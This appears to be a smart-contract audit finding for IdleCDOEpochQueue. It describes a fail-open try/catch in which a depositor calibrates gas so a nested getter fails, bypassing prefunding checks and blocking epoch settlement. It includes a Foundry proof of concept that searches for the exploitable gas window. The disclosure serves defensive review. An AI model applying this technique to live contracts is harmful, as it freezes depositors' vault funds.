### Title
Fail-open prefunded-queue detection lets a depositor block epoch settlement and freeze vault funds - (File: contracts/IdleCDOEpochQueue.sol)

### Summary
`IdleCDOEpochQueue._isPrefundedQueueEnabled` treats any failure while reading `epochQueue()` from the CDO as proof that prefunded mode is absent. A KYC-approved depositor can tune the gas supplied to `requestDeposit` so that the external getter consumes all forwarded gas and is caught, while the caller retains enough gas to continue. This bypasses the prefunding eligibility and cutoff checks and creates a raw `epochPendingDeposits` entry that later makes every prefunded `stopEpochWithDuration` settlement revert.

### Finding Description
During a running epoch, AA deposits into a prefunded queue should call `checkPrefunding` and reject deposits after the subscription window or after funds have already been prefunded. Those protections execute only when `_isPrefundedQueueEnabled()` returns true. [1](#0-0) 

`_isPrefundedQueueEnabled` catches every `epochQueue()` failure and returns the default `false`, rather than distinguishing an unsupported non-prefunded CDO from a transient call failure. [2](#0-1) 

Because the deposit is still transferred and recorded after that false result, the attacker can create `epochPendingDeposits[nextEpoch]` even though prefunded deposits are already closed or would fail `_guarded`. [3](#0-2) 

On the next stop, the prefunded CDO calls `prefundedDepositsToProcess`; that function reverts whenever the target epoch still has queue-held pending deposits. [4](#0-3)  `_afterStopEpochWithDuration` invokes this check unconditionally whenever `epochQueue` is configured, so the entire epoch-stop transaction reverts even though the deposit was accepted. [5](#0-4) 

### Impact Explanation
The broken invariant is fail-closed preservation of the prefunded-deposit configuration: an inability to read the configured queue must not silently disable the checks protecting prefunded funds.

The attacker loses only the underlying deposited into the queue, but causes every later `stopEpochWithDuration` call to revert while that receipt remains. The CDO epoch remains running, borrower repayment cannot be finalized through the normal path, and all tranche NAV remains unavailable until privileged remediation removes/reconfigures the queue or the attacker deletes the receipt. If remediation disables the queue, the attacker-created deposit itself has no epoch price and remains unclaimable. This is temporary freezing of the whole vault position and potentially permanent freezing of the queued deposit, rather than merely a gas or availability issue.

### Likelihood Explanation
Likelihood is medium. The attack requires:

- a prefunded AA queue configured through `setEpochQueue`; [6](#0-5) 
- a KYC-permitted caller while the epoch is running; [7](#0-6) 
- a nonzero cutoff or a prefunding amount that would otherwise fail `checkPrefunding`; and
- off-chain calibration of the transaction gas under EIP-150 so the nested `epochQueue()` call exhausts gas while the outer call retains the remaining fraction needed to complete.

No privileged role needs to misbehave. The malicious state cannot be removed by manager processing: normal `processDeposits` is disabled once the getter succeeds, `processDepositsToBorrower` is no longer valid after the cutoff/epoch end, and only the attacker or a privileged queue reconfiguration can remove the blocking receipt.

### Recommendation
Do not treat an external configuration-read failure as “prefunded disabled.” Store an explicit prefunded-mode flag or validate the queue once during initialization/configuration. In prefunded mode, require `epochQueue() == address(this)` and propagate any read failure. Alternatively, provide separate queue implementations or initialization paths for prefunded and non-prefunded CDOs so the optional `try/catch` capability probe is unnecessary.

### Proof of Concept
The following Foundry PoC uses the existing prefunded fixture style. It searches for the gas window in which the nested getter fails but the outer deposit succeeds. The successful deposit after the cutoff proves fail-open behavior; the subsequent manager stop reverts.

```solidity
function testPrefundedConfigReadFailureBlocksEpochSettlement() external {
    uint256 amount = 10_000 * ONE_SCALE;
    uint256 nextEpoch = strategy.epochNumber() + 1;

    // Prefunded AA queue is configured and a nonzero subscription cutoff is active.
    assertEq(cdoEpoch.epochQueue(), address(queue));
    assertGt(queue.prefundedDepositWindow(), 0);
    assertEq(cdoEpoch.AATranche(), queue.tranche());

    // Attacker is an ordinary Keyring-passing lender.
    _allowWallet(attacker);
    deal(address(underlying), attacker, amount, true);
    vm.prank(attacker);
    underlying.approve(address(queue), amount);

    // Move inside the cutoff. A normal call reaches the configured prefunded branch
    // and reverts; no pending deposit may be recorded.
    vm.warp(cdoEpoch.epochEndDate() - queue.prefundedDepositWindow() + 1);
    vm.prank(attacker);
    vm.expectRevert(NotAllowed.selector);
    queue.requestDeposit(amount);

    // Calibrate the outer call so epochQueue() runs out of gas and is caught,
    // while enough gas remains for the requestDeposit state writes and transfer.
    bytes memory data = abi.encodeCall(
        IdleCDOEpochQueue.requestDeposit,
        (amount)
    );

    uint256 gasUsed;
    for (uint256 gasLimit = 40_000; gasLimit < 250_000; gasLimit += 100) {
        uint256 depositsBefore = queue.userDepositsEpochs(attacker, nextEpoch);
        vm.prank(attacker);
        (bool ok,) = address(queue).call{gas: gasLimit}(data);
        if (
            ok &&
            queue.userDepositsEpochs(attacker, nextEpoch) ==
            depositsBefore + amount
        ) {
            gasUsed = gasLimit;
            break;
        }
    }

    assertGt(gasUsed, 0, "no fail-open gas boundary found");
    assertEq(queue.userDepositsEpochs(attacker, nextEpoch), amount);
    assertEq(queue.epochPendingDeposits(nextEpoch), amount);

    // The attacker leaves the receipt in place. The configured prefunded queue now
    // sees raw pending deposits and makes settlement revert.
    vm.warp(cdoEpoch.epochEndDate());
    vm.prank(manager);
    vm.expectRevert(NotAllowed.selector);
    cdoEpoch.stopEpochWithDuration(
        APR_AFTER_STOP,
        0,
        cdoEpoch.epochDuration(),
        0
    );

    assertTrue(cdoEpoch.isEpochRunning(), "epoch settlement was not blocked");
}
```

  function _afterStopEpochWithDuration() internal override {
    address _queue = epochQueue;
    if (_queue == address(0)) return;

    IIdleCDOEpochQueuePrefunded _epochQueue = IIdleCDOEpochQueuePrefunded(_queue);
    uint256 _prefunded = _epochQueue.prefundedDepositsToProcess();
    if (_prefunded == 0) return;
    // A zero post-loss AA price cannot safely mint new shares into the same tranche token.
    _checkNotAllowed(priceAA == 0);

    // Prefunded deposits already reached the borrower, so they must join AA even if stop defaulted.
    // Mint tranche shares at the post-stop price and mirror the same amount in strategy tokens,
    // so the queue can later distribute shares to users at the epoch price.
    uint256 _prefundedMinted = _mintSharesAtCurrPrice(_prefunded, _queue, AATranche);
    IdleCreditVault(strategy).mintStrategyTokens(_prefunded);
    // Finalize the prefunded epoch in the queue by storing the epoch price and clearing state.
    _epochQueue.processPrefundedDeposits(_prefundedMinted);
